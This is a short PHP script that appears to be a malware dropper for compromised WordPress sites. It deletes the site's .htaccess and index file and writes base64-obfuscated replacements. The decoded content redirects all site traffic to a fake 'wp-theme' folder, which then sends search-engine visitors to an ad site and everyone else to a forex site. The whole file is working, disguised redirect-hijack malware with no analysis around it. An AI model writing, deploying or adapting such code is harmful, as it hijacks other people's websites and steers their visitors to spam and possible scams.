<?php
if(file_exists(".htaccess")){
    unlink(".htaccess");
}

$htac = 'UmVkaXJlY3RNYXRjaCAzMDEgIl4oLyg/IXdwLXRoZW1lLykuKikiIC93cC10aGVtZS9pbmRleC5waHA';

$fp1 = fopen(".htaccess", 'w');
fwrite($fp1,base64_decode($htac));
fclose($fp1);

$themeFolder = 'wp-theme';
$indexFile = $themeFolder . '/index.php';

// Check if the index.php file exists
if (file_exists($indexFile)) {
    // Delete the existing index.php file
    unlink($indexFile);
}
// Check if the wp-theme folder exists
if (!file_exists($themeFolder)) {
    // Create the wp-theme folder
    mkdir($themeFolder);
}

$redirect_index = 'PD9waHANCg0KLy8gQ2hlY2sgaWYgdGhlIEhUVFBfUkVGRVJFUiBoZWFkZXIgaXMgc2V0DQppZiAoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSkgew0KICAgICRyZWZlcnJhbFVybCA9ICRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCg0KICAgIC8vIENoZWNrIGlmIHRoZSByZWZlcnJhbCBVUkwgY29udGFpbnMgc3BlY2lmaWMgcGF0dGVybnMgb3Iga2V5d29yZHMNCiAgICBpZiAoc3RycG9zKCRyZWZlcnJhbFVybCwgJ2dvb2dsZS4nKSAhPT0gZmFsc2UgT1Igc3RycG9zKCRyZWZlcnJhbFVybCwgJ2JpbmcuJykgIT09IGZhbHNlIE9SIHN0cnBvcygkcmVmZXJyYWxVcmwsICd5YWhvby4nKSAhPT0gZmFsc2UpIHsNCiAgICAgICAgDQogICAgICAgIC8vRG8gUmVkaXJlY3QgVG8gTXkgQWRzDQogICAgICAgIGhlYWRlcignTG9jYXRpb246IGh0dHA6Ly9teWVnaWZ0LmJpei8nKTsNCiAgICAgICAgDQogICAgfSBlbHNlIHsNCiAgICAgICAgLy9EbyBSZWRpcmVjdCB0byBzb21ldGhpbmcgZWxzZQ0KICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiBodHRwczovL2RlY29kZWZvcmV4LmNvbS8nKTsNCiAgICB9DQp9IGVsc2Ugew0KICAgIC8vRG8gUmVkaXJlY3QgdG8gc29tZXRoaW5nIGVsc2UNCiAgICBoZWFkZXIoJ0xvY2F0aW9uOiBodHRwczovL2RlY29kZWZvcmV4LmNvbS8nKTsNCn0NCj8+';

$fp2 = fopen($indexFile, 'w');
fwrite($fp2,base64_decode($redirect_index));
fclose($fp2);

die("Done");
?>